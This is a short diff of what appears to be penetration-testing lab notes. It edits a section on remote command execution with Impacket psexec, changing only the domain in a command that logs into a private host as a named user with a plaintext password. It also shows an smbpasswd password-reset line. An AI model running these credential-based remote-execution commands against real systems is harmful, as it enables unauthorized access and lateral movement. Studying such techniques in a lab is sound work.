@@ -127,7 +127,7 @@ smbpasswd -D 3 -r 192.168.1.50 -U 'ankit.sharma'
 ## 4️⃣ Remote Command Execution (Impacket `psexec`)
 
 ```bash
-impacket-psexec armourinfosec.local/ankit.sharma:'@rmour123'@192.168.1.50
+impacket-psexec aman.local/ankit.sharma:'@rmour123'@192.168.1.50
 ```
 
 Executes commands on the remote system using SMB.
